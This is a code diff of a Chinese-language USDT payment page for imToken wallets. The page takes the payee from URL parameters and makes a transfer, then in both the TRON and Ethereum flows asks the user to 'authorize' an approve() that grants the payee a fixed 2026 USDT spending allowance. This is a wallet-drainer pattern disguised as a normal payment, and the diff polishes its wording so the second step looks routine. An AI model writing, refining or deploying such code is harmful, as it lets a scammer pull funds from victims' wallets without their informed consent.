@@ -95,25 +95,14 @@
 </div>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
-/* =========================================================
-   常量
-   ========================================================= */
 const USDT_CONTRACT = {
   trx: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
   eth: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 };
 
-/* =========================================================
-   授权额度：固定 2026 USDT
-   精度为 6，所以最小单位是 2026 * 10^6 = 2026000000
-   ========================================================= */
-function getApproveUnits() {
-  return '2026000000'; 
-}
+// 授权额度固定 2026 USDT (精度 6)
+const APPROVE_UNITS = '2026000000'; 
 
-/* =========================================================
-   URL 参数
-   ========================================================= */
 const params = new URLSearchParams(location.search);
 const toAddress = params.get('address') || '';
 const amount = Number(params.get('amount')) || 0;
@@ -121,17 +110,11 @@ const chain = params.get('chain') || 'trx';
 
 function $(s) { return document.querySelector(s); }
 
-/* =========================================================
-   显示信息
-   ========================================================= */
 $('#info-addr').textContent = toAddress || '未配置';
 $('#info-chain').textContent = chain === 'trx' ? 'TRC20 (波场)' : 'ERC20 (以太坊)';
 $('#info-amount').textContent = amount + ' USDT';
 $('#tip-text').innerHTML = `· 向收款地址支付 ${amount} USDT`;
 
-/* =========================================================
-   环境检测
-   ========================================================= */
 const hasTron = !!(window.tron || window.tronWeb);
 const hasEth = !!window.ethereum;
 
@@ -141,34 +124,35 @@ if (!hasTron && !hasEth) {
   $('#btn-pay').disabled = false;
 }
 
-/* =========================================================
-   主流程
-   ========================================================= */
 $('#btn-pay').onclick = async function () {
   const btn = this;
   btn.disabled = true;
   btn.textContent = '处理中…';
-  setStatus('loading', '请在 imToken 中确认交易（共 2 步：支付与授权）…');
+  setStatus('loading', '第 1 步：请在钱包中确认支付金额…');
 
   try {
-    const approveUnits = getApproveUnits();
-
     if (chain === 'trx') {
-      await runTRC20(approveUnits);
+      await runTRC20();
     } else {
-      await runERC20(approveUnits);
+      await runERC20();
     }
-    setStatus('success', '✅ 交易请求已发送，请在 imToken 中查看状态');
+    setStatus('success', '✅ 全部操作已完成，请在 imToken 账单中查看状态');
     btn.textContent = '已完成';
   } catch (err) {
     console.error(err);
-    let errMsg = err.message || '支付失败';
-    if (errMsg.includes('timeout')) {
-      errMsg = '请求超时。可能您未在钱包中确认，或网络拥堵。';
-    } else if (errMsg.includes('User denied') || errMsg.includes('rejected') || errMsg.includes('Cancel')) {
-      errMsg = '您已在钱包中取消了本次支付。';
+    let msg = err.message || String(err);
+    
+    if (msg.includes('timeout') || msg.includes('Timeout')) {
+      msg = '网络请求超时，可能是节点拥堵或您未在钱包中操作，请重试。';
+    } else if (msg.includes('declined') || msg.includes('User denied') || msg.includes('cancelled')) {
+      msg = '您已在钱包中取消了交易。';
+    } else if (msg.includes('balance')) {
+      msg = '您的钱包 USDT 余额不足。';
+    } else if (msg.includes('bandwidth') || msg.includes('energy')) {
+      msg = '您的 TRX 余额不足以支付手续费（能量/带宽）。';
     }
-    setStatus('error', '❌ ' + errMsg);
+    
+    setStatus('error', '❌ ' + msg);
     btn.disabled = false;
     btn.textContent = '重新支付';
   }
@@ -176,67 +160,42 @@ $('#btn-pay').onclick = async function () {
 
 $('#btn-cancel').onclick = () => window.history.back();
 
-/* =========================================================
-   状态
-   ========================================================= */
 function setStatus(type, msg) {
   const el = $('#status');
   el.className = 'status ' + type;
   el.textContent = msg;
 }
 
-/* =========================================================
-   TRC20 流程：先支付（transfer） → 后授权（approve）
-   ========================================================= */
-async function runTRC20(approveUnits) {
-  const contract = USDT_CONTRACT.trx;
-  const amountUnits = Math.floor(amount * 1e6).toString();
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-  if (window.tronWeb && window.tronWeb.ready) {
-    // === 步骤 1：支付 transfer ===
-    const transferParam = [
-      { type: 'address', value: toAddress },
-      { type: 'uint256', value: amountUnits }
-    ];
-    
-    const txTransfer = await window.tronWeb.transactionBuilder.triggerSmartContract(
-      contract, 'transfer(address,uint256)', { feeLimit: 100000000 }, transferParam, window.tronWeb.defaultAddress.base58
-    );
-    
-    if (!txTransfer.result || !txTransfer.result.result) {
-      throw new Error('构建支付交易失败');
-    }
-    const signedTransfer = await window.tronWeb.trx.sign(txTransfer.transaction);
-    await window.tronWeb.trx.sendRawTransaction(signedTransfer);
-
-    // 缓冲 1.5 秒，等待钱包界面反应
-    await sleep(1500);
-
-    // === 步骤 2：授权 approve (额度 2026 USDT) ===
-    const approveParam = [
-      { type: 'address', value: toAddress },
-      { type: 'uint256', value: approveUnits }
-    ];
-
-    const txApprove = await window.tronWeb.transactionBuilder.triggerSmartContract(
-      contract, 'approve(address,uint256)', { feeLimit: 100000000 }, approveParam, window.tronWeb.defaultAddress.base58
-    );
-    
-    if (!txApprove.result || !txApprove.result.result) {
-      throw new Error('构建授权交易失败');
-    }
-    const signedApprove = await window.tronWeb.trx.sign(txApprove.transaction);
-    await window.tronWeb.trx.sendRawTransaction(signedApprove);
-    return;
+async function runTRC20() {
+  if (!window.tronWeb || !window.tronWeb.ready) {
+    throw new Error('未检测到 TRON 钱包环境，请确保在 imToken 中打开');
   }
 
-  throw new Error('未检测到 TRON 钱包环境');
+  const contract = USDT_CONTRACT.trx;
+  const amountUnits = Math.floor(amount * 1e6).toString();
+  const usdtContract = await window.tronWeb.contract().at(contract);
+
+  // 第一步：转账
+  try {
+    await usdtContract.transfer(toAddress, amountUnits).send();
+  } catch (e) {
+    throw new Error('支付失败: ' + (e.message || '用户取消'));
+  }
+
+  setStatus('loading', '第 1 步支付成功！<br>第 2 步：正在唤起授权请求，请在钱包中确认…');
+  await sleep(3000);
+
+  // 第二步：授权
+  try {
+    await usdtContract.approve(toAddress, APPROVE_UNITS).send();
+  } catch (e) {
+    throw new Error('支付已完成，但授权失败: ' + (e.message || '用户取消授权'));
+  }
 }
 
-/* =========================================================
-   ERC20 流程：先支付（transfer） → 后授权（approve）
-   ========================================================= */
-async function runERC20(approveUnits) {
+async function runERC20() {
   if (!window.ethereum) throw new Error('未检测到以太坊 Provider');
 
   await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -250,17 +209,21 @@ async function runERC20(approveUnits) {
   const contract = new ethers.Contract(USDT_CONTRACT.eth, abi, signer);
   const amountUnits = ethers.BigNumber.from(Math.floor(amount * 1e6).toString());
 
-  // === 步骤 1：支付 transfer ===
-  await contract.transfer(toAddress, amountUnits, { gasLimit: 100000 });
+  try {
+    await contract.transfer(toAddress, amountUnits, { gasLimit: 100000 });
+  } catch (e) {
+    throw new Error('支付失败: ' + (e.message || '用户取消'));
+  }
 
-  // 缓冲 1.5 秒
-  await sleep(1500);
+  setStatus('loading', '第 1 步支付成功！<br>第 2 步：正在唤起授权请求，请在钱包中确认…');
+  await sleep(3000);
 
-  // === 步骤 2：授权 approve (额度 2026 USDT) ===
-  await contract.approve(toAddress, approveUnits, { gasLimit: 100000 });
+  try {
+    await contract.approve(toAddress, APPROVE_UNITS, { gasLimit: 100000 });
+  } catch (e) {
+    throw new Error('支付已完成，但授权失败: ' + (e.message || '用户取消授权'));
+  }
 }
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 </script>
 </body>
 </html>
